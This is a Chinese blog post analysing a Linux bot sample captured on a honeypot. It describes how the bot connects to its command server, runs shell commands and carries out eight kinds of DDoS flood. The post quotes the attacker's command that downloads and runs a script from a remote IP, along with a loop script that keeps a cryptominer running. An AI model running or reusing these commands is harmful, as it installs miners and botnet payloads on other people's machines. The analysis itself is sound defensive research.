---
layout: post
title: "MalwareMustDie lx样本分析"
---

# 0x00 背景

蜜罐上捕获到`wget`下载的样本，顺着网址一访问发现是用`HttpFileServer v2.3k 299`国产软件搭建的http服务，隐约感觉这种软件会有溢出漏洞，但也没时间去看页面就访问不了了。可以证明其下载的恶意软件出自国人之手，VT上也还没有相关的检测：

![][1]

<!-- more -->

该样本也是个被控端，接收主控端指令后可以`system`执行，该样本执行了如下命令：

```
sh -c cd /bin;rm -rf uninstall* ;wget http://xx.xx.xx.xx:6892/uninstall;chmod 777 uninstall;sh uninstall
```

下载运行的脚本文件主要是循环检测运行netwrite文件：

```
while true; 
do
	pkill -9 wipefs;
	rm -rf /bin/wipefs;
  count=`ps -ef |grep netwrite |grep -v "grep" |wc -l`
  if [ 0 == $count ]; then
     cd /bin;./netwrite; 
  fi
  sleep 60 
done
```

[该文件](https://www.virustotal.com/#/file/fdb42232c5c2fd226662b3571179f5dd573d6fa513cc5bd7c9c5a456315591aa/detection)也就是常见的挖挖比特币：

![][2]

样本逆向看了一下还是处于开发阶段，主要有接收指令执行命令和DOS功能。

# 0x01 连接主控端

样本先调用`if_nameindex`查看是否有网，然后调用空函数`CreateAutoRun`，所以应该还是开发阶段的程序。接下来又是很奇怪地使用两个函数来连接主控端并处理接收指令，对比了一下功能都是一样的，只是主控端的域名和端口不同，另外一个函数会是sleep 8分钟再去开线程连接主控端，域名端口如下：

```
o.xxxx.cn:21
www.xxxx.club:3065
```

从这域名注册信息也可以看出是很符合国内黑阔大佬的风格：

![][3]

一旦连接成功后就会自报主机的release版本和其他信息：

![][4]

# 0x02 接收指令

![][5]

## CmdShell

前4个字节比较为5后，后面的字符串便会传递给`system`函数执行。

## DealwithDDoS

其中主要有8个类型的DOS攻击，下面分析一下指令的结构和攻击的效果。

### SYN_Flood

![][6]

伪造的源端口每次会增加0x100。

![][7]

### UDP_Flood

![][8]

向目的udp端口发送1024字节的X字符。

![][9]

### ICMP_Flood

和UDP_Flood类似，发送的udp数据包data大小为2048字节。

### DNS_Flood

![][10]

会生成随机的Name和Type对目的DNS服务器进行查询。

![][11]

### GET_Flood

![][12]

需要手动添加`\x00`截断ip和url；在url的后面会添加5个随机生成的字节。

![][13]

### POST_Flood

和GET_Flood类似，只是改成了POST。

### FAST_Flood

GET_Flood without headers，只有Host Header。

### TCP_Flood

完全没有header的GET_Flood。

## StopFlag

在上述的Flood攻击中都会do-while地发送数据包，StopFlag就是用于停止攻击的指令：

![][14]

# 0x03 总结

样本主要是开启新线程去执行指令，代码量有些重复分析起来也比较简单。新年伊始，也希望能够赶上自动化分析的脚步，真正做到MalwareMustDie。


[1]: https://wx1.sinaimg.cn/large/ee2fecafgy1fnmzh1zaa7j20x002mmxw.jpg
[2]: https://wx4.sinaimg.cn/large/ee2fecafgy1fnmzh3muyoj20w00csgn3.jpg
[3]: https://wx1.sinaimg.cn/large/ee2fecafgy1fnmzh4t0gyj20h907fglj.jpg
[4]: https://wx1.sinaimg.cn/large/ee2fecafgy1fnmzh62z52j20jb027q2u.jpg
[5]: https://wx4.sinaimg.cn/large/ee2fecafgy1fnmzh7m665j20kj07n3yj.jpg
[6]: https://wx3.sinaimg.cn/large/ee2fecafgy1fnmzh8gwvtj20lc02ma9w.jpg
[7]: https://wx2.sinaimg.cn/large/ee2fecafgy1fnmzhai9vfj20ra078myi.jpg
[8]: https://wx2.sinaimg.cn/large/ee2fecafgy1fnmzhbo7g9j20gk02kglf.jpg
[9]: https://wx2.sinaimg.cn/large/ee2fecafgy1fnmzhdbwz6j20sp07dwfr.jpg
[10]: https://wx1.sinaimg.cn/large/ee2fecafgy1fnmzhecev2j20gw02lt8j.jpg
[11]: https://wx3.sinaimg.cn/large/ee2fecafgy1fnmzhg33e2j20so05bta2.jpg
[12]: https://wx2.sinaimg.cn/large/ee2fecafgy1fnmzhgzvo6j20is02k0sk.jpg
[13]: https://wx4.sinaimg.cn/large/ee2fecafgy1fnmzhia4xnj20kk069wf2.jpg
[14]: https://wx1.sinaimg.cn/large/ee2fecafgy1fnmzhitmrrj20em028a9v.jpg
